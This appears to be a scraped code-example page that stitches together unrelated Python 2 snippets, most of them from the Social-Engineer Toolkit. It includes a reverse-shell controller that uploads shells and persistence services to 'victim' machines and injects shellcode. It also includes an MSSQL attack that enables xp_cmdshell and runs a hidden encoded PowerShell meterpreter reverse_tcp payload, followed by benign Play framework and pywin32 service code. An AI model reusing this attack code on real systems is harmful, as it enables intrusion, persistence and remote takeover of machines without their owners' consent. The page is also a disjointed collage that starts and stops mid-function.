                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the filewrite

                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"

                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload interactive shell to victim machine."

                        # start a loop
                        data_file = fileopen.read()

                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] SET Interactive shell successfully uploaded to victim."

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

                    send_packet(ipaddress, conn, encryption)
                    print "[*] You should have a new shell spawned that is UAC safe in a few seconds..."

                # remove persistence
                if data == "removepersistence":
                    print "[*] Telling interactive shell to remove persistence from startup."
                    send_packet(data, conn, encryption)
                    print "[*] Service has been scheduled for deletion. It may take a reboot or when the 30 minute loop is finished."

                # persistence
                if data == "persistence":

                    # we place a try except block here, if UAC is enabled persistence fails for now

                    try:

                        # send that we want to upload a file to the victim controller for persistence
                        send_packet(data, conn, encryption)

                        time.sleep(0.5)

                        # now that we're inside that loop on victim we need to give it parameters
                        # we will send the write_path to the victim to prep the filewrite

                        write_path= "not needed"

                        # send packet over
                        send_packet(write_path, conn, encryption)

                        # specify null variable to store our buffer for our file
                        data_file = ""

                        if os.path.isfile("src/payloads/set_payloads/persistence.binary"):
                            if core_modules == True:
                                subprocess.Popen("cp src/payloads/set_payloads/persistence.binary %s" % (setdir), shell=True).wait()
                                upx("%s/persistence.binary" % (setdir))
                                upload = "%s/persistence.binary" % (setdir)
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/persistence.binary"

                        if os.path.isfile("persistence.binary"):
                            upload = "persistence.binary"

                        if os.path.isfile(upload):
                            fileopen = file(upload, "rb")

                            print "[*] Attempting to upload the SET Interactive Service to the victim."
                            # start a loop
                            data_file = fileopen.read()
                            fileopen.close()

                            # send the file line by line to the system
                            send_packet(data_file, conn, encryption)

                            # receive length of confirmation
                            data = conn.recv(1024)
                            # decrypt the confirmation
                            data = decrypt_packet(data,encryption)
                            # now receive confirmation
                            data = conn.recv(int(data))
                            # encrypt our confirmation or failed upload
                            data = decrypt_packet(data,encryption)

                            # if we were successful
                            if data == "Confirmed":
                                print "[*] Initial service has been uploaded to victim successfully."

                            # if we failed
                            if data == "Failed":
                                print "[!] File had an issue saving to the victim machine. Try Again?"

                        time.sleep(0.5)

                        # now that we're inside that loop on victim we need to give it parameters
                        # we will send the write_path to the victim to prep the filewrite

                        send_packet(write_path, conn, encryption)

                        # specify null variable to store our buffer for our file
                        data_file = ""

                        if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                            if core_modules == True:
                                subprocess.Popen("cp src/payloads/set_payloads/shell.windows %s" % (setdir), shell=True).wait()
                                upx(setdir + "/shell.windows")
                                upload = setdir + "/shell.windows"
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/shell.windows"

                        if os.path.isfile("shell.windows"):
                            upload = "shell.windows"

                        if os.path.isfile(upload):
                            fileopen = file(upload, "rb")

                            print "[*] Attempting to upload SET Interactive Shell to victim machine."

                            # start a loop
                            data_file = fileopen.read()

                            fileopen.close()

                            # send the file line by line to the system
                            send_packet(data_file, conn, encryption)

                            # receive length of confirmation
                            data = conn.recv(1024)
                            # decrypt the confirmation
                            data = decrypt_packet(data,encryption)
                            # now receive confirmation
                            data = conn.recv(int(data))
                            # encrypt our confirmation or failed upload
                            data = decrypt_packet(data,encryption)

                            # if we were successful
                            if data == "Confirmed":
                                print "[*] SET Interactive shell successfully uploaded to victim."

                            # if we failed
                            if data == "Failed":
                                print "[!] File had an issue saving to the victim machine. Try Again?"

                        send_packet(ipaddress, conn, encryption)
                        print "[*] Service has been created on the victim machine. You should have a connection back every 30 minutes."

                    except Exception:
                        print "[!] Failed to create service on victim. If UAC is enabled this will fail. Even with bypassUAC."

                # if data is equal to upload
                if data == "upload":

                    # trigger our shell to go in downloadfile mode
                    data = "uploadfile"

                    # send that we want to upload a file to the victim controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the filewrite
                    send_packet(write_path, conn, encryption)


                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload %s to %s on victim machine." % (upload,write_path)
                        # start a loop
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] File has been uploaded to victim under path: " + write_path

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

                    # if file wasn't found
                    else:
                        print "[!] File wasn't found. Try entering the path again."

                # if data == ssh_port_tunnel
                if data == "ssh_tunnel":

                    # let the server know it needs to switch to paramiko mode
                    data = "paramiko"
                    print "[*] Telling the victim machine we are switching to SSH tunnel mode.."
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)
                    # receive length of confirmation
                    data = conn.recv(1024)
                    # decrypt the confirmation
                    data = decrypt_packet(data,encryption)
                    # now receive confirmation
                    data = conn.recv(int(data))
                    # decrypt packet
                    data = decrypt_packet(data,encryption)
                    if data == "Paramiko Confirmed.":
                        print "[*] Acknowledged the server supports SSH tunneling.."
                        # send all the data over
                        data = ssh_server_ip + "," + ssh_server_port_address + "," + ssh_server_tunnel_port + "," + ssh_server_username + "," + ssh_server_password + "," + victim_server_port
                        # encrypt the packet and send it over
                        send_packet(data, conn, encryption)
                        print "[*] Tunnel is establishing, check IP Address: " + ssh_server_ip + " on port: " +ssh_server_tunnel_port
                        print "[*] As an example if tunneling RDP you would rdesktop localhost 3389"

                # list running processes
                if data == "ps":
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # recv data
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data=decrypt_packet(dataout,encryption)

                    print data

                # reboot server
                if data == "reboot now":
                    data = "reboot"
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # recv data
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data=decrypt_packet(dataout,encryption)

                    print data

                # if data is equal to pid kill
                if data == "kill":
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # send the pid of the packet we want
                    send_packet(pid_number, conn, encryption)

                    # wait for confirmation that it was killed
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    print "[*] Process has been killed with PID: " + pid_number

                    data = conn.recv(1024)

                # if we are executing a command on the local operating system
                if data == "exec":
                    # execute the command via subprocess
                    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    # pipe output for stdout and stderr
                    stdout_value = proc.stdout.read()
                    stderr_value = proc.stderr.read()
                    data = stdout_value + stderr_value
                    print data


           # if data is equal to shellcode
                if data == "shellcode":

                    # send that we want to use shellcode to execute
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)
                    # send the file line by line to the system
                    send_packet(shellcode_inject, conn, encryption)

        # handle the main exceptions
        except Exception, e:
            print "[!] Something went wrong printing error: " + str(e)
            log(e)
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
            sys.exit() #exit_set()

        if data == "quit" or data == "exit" or data == "back":
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

    print_status("The Social-Engineer Toolkit (SET) is listening on: 0.0.0.0:" + str(PORT))

    # define basic dictionary
    global d
    d = {}

    # function for updating dictionary
    def update_dict(conn,addr):
            # update dictionary
        d[conn] = addr[0]

    def call_connections(d,garbage1,garbage2,garbage3):
        global count
        count = 2
        counter = 1

        if false_shell == False:

                    #if tab_complete == True:
                    #        completer = Completer2()
                    #        readline.set_completer(completer.complete)

            while 1:
                try:
                    print "*** Pick the number of the shell you want ***\n"
                    for records in d.iteritems():
                        if records[1] != "127.0.0.1":
                            print str(counter)+": " + records[1]
                            counter += 1
                    print "\n"
                    # allow us to see connections running in the background
                    choice = raw_input(setprompt("0", ""))
                    choice = int(choice)
                    # if our choice is invalid because the user entered a higher number than what was listed, we then cycle back through the loop
                    if choice > counter - 1:
                        print "[!] Invalid choice, please enter a valid number to interact with."
                    if choice <= counter - 1:
                        break
                    counter = 1

                except ValueError:
                    counter = 1
                    if choice == "quit" or choice == "exit" or choice == "back":
                        print_status("Returning back to the main menu.")
                        break
                    if len(choice) != 0:
                        choice = str(choice)
                        print "[!] Invalid choice, please enter a valid number to interact with."

            if choice == "quit" or choice == "exit" or choice == "back":
                choice = 1
                sockobj = socket.socket(AF_INET, SOCK_STREAM)
                sockobj.connect(('', PORT))

            choice = int(choice) - 1

            # counter to dictionary
            dict_point = 0

            for records in d.iteritems():

                # pull our socket handle
                if choice == dict_point:

                    # grab socket handler
                    conn = records[0]
                    # grab address
                    addr = records[1]

                    # needed to unhose address name and to identify if we need to add
                    # additional flags. This is a temporary workaround, will add a full
                    # fledge handler of flags soon.
                    #
                    # addr = addr.replace(":UAC-Safe", "")
                    # addr = addr.replace("WINDOWS:SYSTEM", "")
                    # addr = addr.replace(":POSIX", "")
                    # addr = addr.replace(":WINDOWS:UAC-SAFE", "")
                    # addr = addr.replace(":WINDOWS", "")

                    # call our shell handler
                    thread.start_new_thread(handle_connection,(conn,addr,encryption,operating_system))

                # increment dict_point until we hit choice
                dict_point += 1


    try:
        while 1:

            if tab_complete == True:
                completer = Completer2()
                readline.set_completer(completer.complete)

            # connection and address for victim
            conn, addr = mysock.accept()

            # bypass counter
            bypass_counter = 0

            # if for some reason we got something connecting locally just bomb out
            if addr[0] == "127.0.0.1":
                conn.close()
                sys.exit() # pass

            # here we test to see if the SET shell is really there or someone
            # connected to it.
            false_shell = False
            if addr[0] != "127.0.0.1":
                try:
        # we set a 5 second timeout for socket to send data
                    data=conn.recv(27)

                except Exception, e:
                    print e
                    false_shell = True

                # if it isn't windows
                if data != "IHAYYYYYIAMSETANDIAMWINDOWS":
                    # if it isn't nix
                    if data != "IHAYYYYYIAMSETANDIAMPOSIXXX":
                        false_shell = True

                # if we have a windows shell
                if data == "IHAYYYYYIAMSETANDIAMWINDOWS":

                    if os.path.isfile(setdir + "/system.address"):
                        fileopen = file(setdir + "/system.address", "r")
                        system = fileopen.read().rstrip()
                        system = system.replace(":WINDOWS", "")
                        system = system.replace(":UAC-SAFE", "")
                        if str(addr[0]) == str(system):
                            temp_addr = str(addr[0] + ":WINDOWS:SYSTEM")
                            bypass_counter = 1

                    if os.path.isfile(setdir + "/uac.address"):
                        fileopen = file(setdir + "/uac.address", "r")
                        uac = fileopen.read().rstrip()
                        uac = uac.replace(":WINDOWS", "")
                        if str(addr[0]) == str(uac):
                            temp_addr = str(addr[0] + ":WINDOWS:UAC-SAFE")
                            bypass_counter = 1

                    if bypass_counter != 1:
                        temp_addr = str(addr[0] + ":WINDOWS")

                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn,temp_addr)
                    operating_system = "windows"
                    bypass_counter = 1

                # if we have a nix shell
                if data == "IHAYYYYYIAMSETANDIAMPOSIXXX":
                    temp_addr = str(addr[0] + ":POSIX")
                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn,temp_addr)
                    operating_system = "posix"
                    bypass_counter = 1

            if bypass_counter == 0:
                if addr[0] != "127.0.0.1":
                    if false_shell == False:
                        update_dict(conn,addr)

            # reset value
            # if uac != None:
            if os.path.isfile(setdir + "/uac.address"):
                os.remove(setdir + "/uac.address")
                bypass_counter = 0

            if os.path.isfile(setdir + "/system.address"):
                os.remove(setdir + "/system.address")
                bypass_counter = 0

            if addr[0] != "127.0.0.1":
                if false_shell == False:
                    print "[*] Connection received from: " + addr[0] + "\n"

            # set the counter if we get more threads that are legitimate
            if false_shell == False:
                count += 1

            try:

                # the first time we try this we dont want to start anything else
                if count == 1:
                            # call our main caller handler
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

            except TypeError, e: # except typerrors
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

            except Exception, e: # handle exceptions
                print "[!] Something went wrong. Printing error: " + str(e)
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

    # handle control-c
    except KeyboardInterrupt:
        exit_menu()
        sys.exit(-1)

    # handle all exceptions
    except Exception, e:
        print_error("Something went wrong: ")
        print bcolors.RED + str(e) + bcolors.ENDC
        count = 2
        garbage1 = ""
        garbage2 = ""
        garbage3 = ""
        thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
        log(e)
        sys.exit()

# if we are calling from cli
#if __name__ == '__main__':
 
Example 54
From project social-engineer-toolkit, under directory src/core, in source file scapy.py.
Score: 5
vote
vote
def whois(self):
        os.system("whois %s" % self.src)
     
Example 55
From project social-engineer-toolkit, under directory src/fasttrack, in source file mssql.py.
Score: 5
vote
vote
def deploy_hex2binary(ipaddr,port,username,password):

    mssql = tds.MSSQL(ipaddr, int(port))
    mssql.connect()
    mssql.login("master", username, password)
    print_status("Enabling the xp_cmdshell stored procedure...")
    try:
        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
    except: pass
    print_status("Checking if powershell is installed on the system...")
    # just throw a simple command via powershell to get the output
    mssql.sql_query("exec master..xp_cmdshell 'powershell -Version'")
    bundle = str(capture(mssql.printRows))
    # remove null byte terminators from capture output
    bundle = bundle.replace("\\x00", "")
    # search for parameter version - standard output for powershell -Version command
    match = re.search("parameter version", bundle)
    # if we have a match we have powershell installed
    if match:
        print_status("Powershell was identified, targeting server through powershell injection.")
        option = "1"
    # otherwise, fall back to the older version using debug conversion via hex
    else:
        print_status("Powershell not detected, attempting Windows debug method.")
        option = "2"

    # if we don't have powershell
    if option == "2":
        try: reload(src.core.payloadgen.create_payloads)
        except: import src.core.payloadgen.create_payloads
        print_status("Connection established with SQL Server...")
        print_status("Converting payload to hexadecimal...")
        # if we are using a SET interactive shell payload then we need to make the path under web_clone versus ~./set
        if os.path.isfile(setdir + "/set.payload"):
            web_path = (setdir + "/web_clone/")
        # then we are using metasploit
        if not os.path.isfile(setdir + "/set.payload"):
            if operating_system == "posix":
                web_path = (setdir)
                # if it isn't there yet
                if not os.path.isfile(setdir + "/1msf.exe"):
                    # move it then
                    subprocess.Popen("cp %s/msf.exe %s/1msf.exe" % (setdir, setdir), shell=True).wait()
                subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
        fileopen = file("%s/1msf.exe" % (web_path), "rb")
        # read in the binary
        data = fileopen.read()
        # convert the binary to hex
        data = binascii.hexlify(data)
        # we write out binary out to a file
        filewrite = file(setdir + "/payload.hex", "w")
        filewrite.write(data)
        filewrite.close()

        # if we are using metasploit, start the listener
        if not os.path.isfile(setdir + "/set.payload"):
            if operating_system == "posix":
                try:reload(pexpect)
                except: import pexpect
                print_status("Starting the Metasploit listener...")
                msf_path = meta_path()
                child2 = pexpect.spawn("%s/msfconsole -r %s/meta_config" % (msf_path,setdir))

        # random executable name
        random_exe = generate_random_string(10,15)

    #
    # next we deploy our hex to binary if we selected option 1 (powershell)
    #

    if option == "1":
        print_status("Using powershell x86 process downgrade attack..")
        payload = "x86"

        # specify ipaddress of reverse listener
        ipaddr = grab_ipaddress()
        update_options("IPADDR=" + ipaddr)
        port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
        if port == "": port = "443"
        update_options("PORT=" + port)
        update_options("POWERSHELL_SOLO=ON")
        print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
        filewrite = file(setdir + "/payload_options.shellcode", "w")
        # format needed for shellcode generation
        filewrite.write("windows/meterpreter/reverse_tcp" + " " + port + ",")
        filewrite.close()
        try: reload(src.payloads.powershell.prep)
        except: import src.payloads.powershell.prep
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")

        x86 = file(setdir + "/x86.powershell", "r")
        x86 = x86.read()
        x86 = "powershell -nop -win hidden -noni -enc " + x86
        print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
        filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
        filewrite.write(x86)
        filewrite.close()
        # if our payload is x86 based - need to prep msfconsole rc 
        if payload == "x86":
                powershell_command = x86
                powershell_dir = setdir + "/reports/powershell/x86_powershell_injection.txt"
                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
                filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
                filewrite.close()

        # grab the metasploit path from config or smart detection
        msf_path = meta_path()
        if operating_system == "posix":
                try: reload(pexpect)
                except: import pexpect
                print_status("Starting the Metasploit listener...")
                child2 = pexpect.spawn("%s/msfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))

        # assign random_exe command to the powershell command
        random_exe = powershell_command

    #
    # next we deploy our hex to binary if we selected option 2 (debug)
    #
    
    if option == "2":
        # we selected hex to binary
        fileopen = file("src/payloads/hex2binary.payload", "r")
        # specify random filename for deployment
        print_status("Deploying initial debug stager to the system.")
        random_file = generate_random_string(10,15)
        for line in fileopen:
            # remove bogus chars
            line = line.rstrip()
            # make it printer friendly to screen
            print_line = line.replace("echo e", "")
            print_status("Deploying stager payload (hex): " + bcolors.BOLD + str(print_line) + bcolors.ENDC)
            mssql.sql_query("exec master..xp_cmdshell '%s>> %s'" % (line,random_file))
        print_status("Converting the stager to a binary...")
        # here we convert it to a binary
        mssql.sql_query("exec master..xp_cmdshell 'debug<%s'" % (random_file))
        print_status("Conversion complete. Cleaning up...")
        # delete the random file
        mssql.sql_query("exec master..xp_cmdshell 'del %s'" % (random_file))

        # here we start the conversion and execute the payload
        print_status("Sending the main payload via to be converted back to a binary.")
        # read in the file 900 bytes at a time
        fileopen = file(setdir + "/payload.hex", "r")
        while fileopen:
            data = fileopen.read(900).rstrip()
            # if data is done then break out of loop because file is over
            if data == "": break
            print_status("Deploying payload to victim machine (hex): " + bcolors.BOLD + str(data) + bcolors.ENDC + "\n")
            mssql.sql_query("exec master..xp_cmdshell 'echo %s>> %s'" % (data, random_exe))
        print_status("Delivery complete. Converting hex back to binary format.")

        mssql.sql_query("exec master..xp_cmdshell 'rename MOO.bin %s.exe'" % (random_file))
        mssql.sql_query("exec master..xp_cmdshell '%s %s'" % (random_file, random_exe))
        # clean up the old files
        print_status("Cleaning up old files..")
        mssql.sql_query("exec master..xp_cmdshell 'del %s'" % (random_exe))

        # if we are using SET payload
        if os.path.isfile(setdir + "/set.payload"):
            print_status("Spawning seperate child process for listener...")
            try: shutil.copyfile(setdir + "/web_clone/x", definepath)
            except: pass

            # start a threaded webserver in the background
            subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
            # grab the port options

            if check_options("PORT=") != 0:
                port = check_options("PORT=")

            # if for some reason the port didnt get created we default to 443
            else:
                port = "443"

    # thread is needed here due to the connect not always terminating thread, it hangs if thread isnt specified
    try: reload(thread)
    except: import thread
    # execute the payload
    # we append more commands if option 1 is used

    if option == "1":
        print_status("Trigger the powershell injection payload.. ")
        mssql.sql_query("exec master..xp_cmdshell '%s'" % (powershell_command))

    if option == "2":
        sql_command = ("xp_cmdshell '%s'" % (random_exe))
        # start thread of SQL command that executes payload
        thread.start_new_thread(mssql.sql_query, (sql_command,))
        time.sleep(1)

    # pause to let metasploit launch - real slow systems may need to adjust
    # i need to rewrite this to do a child.expect on msf and wait until that happens
    print_status("Pausing 15 seconds to let the system catch up...")
    time.sleep(15)
    print_status("Triggering payload stager...")

    # if pexpect doesnt exit right then it freaks out
    if os.path.isfile(setdir + "/set.payload"):
        os.system("python ../../payloads/set_payloads/listener.py")
    try:
        # interact with the child process through pexpect
        child2.interact()
        try:
            os.remove("x")
        except: pass
    except: pass


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
 
Example 56
From project play1, under directory framework/pym/play/commands, in source file modulesrepo.py.
Score: 5
vote
vote
def build(app, args, env):
    ftb = env["basedir"]
    version = None
    name = None
    fwkMatch = None
    origModuleDefinition = None

    try:
        optlist, args = getopt.getopt(args, '', ['framework=', 'version=', 'require='])
        for o, a in optlist:
            if o in ('--framework'):
                ftb = a
            if o in ('--version'):
                version = a
            if o in ('--require'):
                fwkMatch = a
    except getopt.GetoptError, err:
        print "~ %s" % str(err)
        print "~ "
        sys.exit(-1)

    deps_file = os.path.join(app.path, 'conf', 'dependencies.yml')
    if os.path.exists(deps_file):
        f = open(deps_file)
        deps = yaml.load(f.read())
	if 'self' in deps:
           splitted = deps["self"].split(" -> ")
           if len(splitted) == 2:
            	nameAndVersion = splitted.pop().strip()
                splitted = nameAndVersion.split(" ")
                if len(splitted) == 2:
                   version = splitted.pop()
                   name = splitted.pop()
        for dep in deps["require"]:
            if isinstance(dep, basestring):
                splitted = dep.split(" ")
                if len(splitted) == 2 and splitted[0] == "play":
                    fwkMatch = splitted[1]
        f.close

    if name is None:
        name = os.path.basename(app.path)
    if version is None:
        version = raw_input("~ What is the module version number? ")
    if fwkMatch is None:
        fwkMatch = raw_input("~ What are the playframework versions required? ")

    if os.path.exists(deps_file):
        f = open(deps_file)
        deps = yaml.load(f.read())
	if 'self' in deps:
           splitted = deps["self"].split(" -> ")
           f.close()
           if len(splitted) == 2:
               nameAndVersion = splitted.pop().strip()
               splitted = nameAndVersion.split(" ")
               if len(splitted) == 1:
                  try:
                    deps = open(deps_file).read()
                    origModuleDefinition = re.search(r'self:\s*(.*)\s*', deps).group(1)
                    modifiedModuleDefinition = '%s %s' % (origModuleDefinition, version)
                    replaceAll(deps_file, origModuleDefinition, modifiedModuleDefinition)
                  except:
                    pass
        

    build_file = os.path.join(app.path, 'build.xml')
    if os.path.exists(build_file):
        print "~"
        print "~ Building..."
        print "~"
        os.system('ant -f %s -Dplay.path=%s' % (build_file, ftb) )
        print "~"

    mv = '%s-%s' % (name, version)
    print("~ Packaging %s ... " % mv)

    dist_dir = os.path.join(app.path, 'dist')
    if os.path.exists(dist_dir):
        shutil.rmtree(dist_dir)
    os.mkdir(dist_dir)

    manifest = os.path.join(app.path, 'manifest')
    manifestF = open(manifest, 'w')
    manifestF.write('version=%s\nframeworkVersions=%s\n' % (version, fwkMatch))
    manifestF.close()

    zip = zipfile.ZipFile(os.path.join(dist_dir, '%s.zip' % mv), 'w', zipfile.ZIP_STORED)
    for (dirpath, dirnames, filenames) in os.walk(app.path):
        if dirpath == dist_dir:
            continue
        if dirpath.find(os.sep + '.') > -1 or dirpath.find('/tmp/') > -1  or dirpath.find('/test-result/') > -1 or dirpath.find('/logs/') > -1 or dirpath.find('/eclipse/') > -1 or dirpath.endswith('/test-result') or dirpath.endswith('/logs')  or dirpath.endswith('/eclipse') or dirpath.endswith('/nbproject'):
            continue
        for file in filenames:
            if file.find('~') > -1 or file.endswith('.iml') or file.startswith('.'):
                continue
            zip.write(os.path.join(dirpath, file), os.path.join(dirpath[len(app.path):], file))
    zip.close()

    os.remove(manifest)
    
    # Reset the module definition
    if origModuleDefinition:
        try:
            replaceAll(deps_file, '%s %s' % (origModuleDefinition, version), origModuleDefinition)
        except:
            pass

    print "~"
    print "~ Done!"
    print "~ Package is available at %s" % os.path.join(dist_dir, '%s.zip' % mv)
    print "~"

 
Example 57
From project play1, under directory python/Lib/site-packages/win32/lib, in source file win32serviceutil.py.
Score: 5
vote
vote
def HandleCommandLine(cls, serviceClassString = None, argv = None, customInstallOptions = "", customOptionHandler = None):
    """Utility function allowing services to process the command line.

    Allows standard commands such as 'start', 'stop', 'debug', 'install' etc.

    Install supports 'standard' command line options prefixed with '--', such as
    --username, --password, etc.  In addition,
    the function allows custom command line options to be handled by the calling function.
    """
    err = 0

    if argv is None: argv = sys.argv

    if len(argv)<=1:
        usage()

    serviceName = cls._svc_name_
    serviceDisplayName = cls._svc_display_name_
    if serviceClassString is None:
        serviceClassString = GetServiceClassString(cls)

    # Pull apart the command line
    import getopt
    try:
        opts, args = getopt.getopt(argv[1:], customInstallOptions,["password=","username=","startup=","perfmonini=", "perfmondll=", "interactive", "wait="])
    except getopt.error, details:
        print details
        usage()
    userName = None
    password = None
    perfMonIni = perfMonDll = None
    startup = None
    interactive = None
    waitSecs = 0
    for opt, val in opts:
        if opt=='--username':
            userName = val
        elif opt=='--password':
            password = val
        elif opt=='--perfmonini':
            perfMonIni = val
        elif opt=='--perfmondll':
            perfMonDll = val
        elif opt=='--interactive':
            interactive = 1
        elif opt=='--startup':
            map = {"manual": win32service.SERVICE_DEMAND_START, "auto" : win32service.SERVICE_AUTO_START, "disabled": win32service.SERVICE_DISABLED}
            try:
                startup = map[string.lower(val)]
            except KeyError:
                print "'%s' is not a valid startup option" % val
        elif opt=='--wait':
            try:
                waitSecs = int(val)
            except ValueError:
                print "--wait must specify an integer number of seconds."
                usage()

    arg=args[0]
    knownArg = 0
    # First we process all arguments which pass additional args on
    if arg=="start":
        knownArg = 1
        print "Starting service %s" % (serviceName)
        try:
            StartService(serviceName, args[1:])
            if waitSecs:
                WaitForServiceStatus(serviceName, win32service.SERVICE_RUNNING, waitSecs)
        except win32service.error, (hr, fn, msg):
            print "Error starting service: %s" % msg

    elif arg=="restart":
        knownArg = 1
        print "Restarting service %s" % (serviceName)
        RestartService(serviceName, args[1:])
        if waitSecs:
            WaitForServiceStatus(serviceName, win32service.SERVICE_RUNNING, waitSecs)

    elif arg=="debug":
        knownArg = 1
        if not hasattr(sys, "frozen"):
            # non-frozen services use pythonservice.exe which handles a
            # -debug option
            svcArgs = string.join(args[1:])
            try:
                exeName = LocateSpecificServiceExe(serviceName)
            except win32api.error, exc:
                if exc[0] == winerror.ERROR_FILE_NOT_FOUND:
                    print "The service does not appear to be installed."
                    print "Please install the service before debugging it."
                    sys.exit(1)
                raise
            try:
                os.system("%s -debug %s %s" % (exeName, serviceName, svcArgs))
            # ^C is used to kill the debug service.  Sometimes Python also gets
            # interrupted - ignore it...
            except KeyboardInterrupt:
                pass
        else:
            # py2exe services don't use pythonservice - so we simulate
            # debugging here.
            DebugService(cls, args)

    if not knownArg and len(args)<>1:
        usage() # the rest of the cmds don't take addn args

    if arg=="install":
        knownArg = 1
        try:
            serviceDeps = cls._svc_deps_
        except AttributeError:
            serviceDeps = None
        try:
            exeName = cls._exe_name_
        except AttributeError:
            exeName = None # Default to PythonService.exe
        try:
            exeArgs = cls._exe_args_
        except AttributeError:
            exeArgs = None
        try:
            description = cls._svc_description_
        except AttributeError:
            description = None
        print "Installing service %s" % (serviceName,)
        # Note that we install the service before calling the custom option
        # handler, so if the custom handler fails, we have an installed service (from NT's POV)
        # but is unlikely to work, as the Python code controlling it failed.  Therefore
        # we remove the service if the first bit works, but the second doesnt!
        try:
            InstallService(serviceClassString, serviceName, serviceDisplayName, serviceDeps = serviceDeps, startType=startup, bRunInteractive=interactive, userName=userName,password=password, exeName=exeName, perfMonIni=perfMonIni,perfMonDll=perfMonDll,exeArgs=exeArgs,description=description)
            if customOptionHandler:
                apply( customOptionHandler, (opts,) )
            print "Service installed"
        except win32service.error, (hr, fn, msg):
            if hr==winerror.ERROR_SERVICE_EXISTS:
                arg = "update" # Fall through to the "update" param!
            else:
                print "Error installing service: %s (%d)" % (msg, hr)
                err = hr
        except ValueError, msg: # Can be raised by custom option handler.
            print "Error installing service: %s" % str(msg)
            err = -1
            # xxx - maybe I should remove after _any_ failed install - however,
            # xxx - it may be useful to help debug to leave the service as it failed.
            # xxx - We really _must_ remove as per the comments above...
            # As we failed here, remove the service, so the next installation
            # attempt works.
            try:
                RemoveService(serviceName)
            except win32api.error:
                print "Warning - could not remove the partially installed service."

    if arg == "update":
        knownArg = 1
        try:
            serviceDeps = cls._svc_deps_
        except AttributeError:
            serviceDeps = None
        try:
            exeName = cls._exe_name_
        except AttributeError:
            exeName = None # Default to PythonService.exe
        try:
            exeArgs = cls._exe_args_
        except AttributeError:
            exeArgs = None
        try:
            description=cls._svc_description_
        except AttributeError:
            description=None
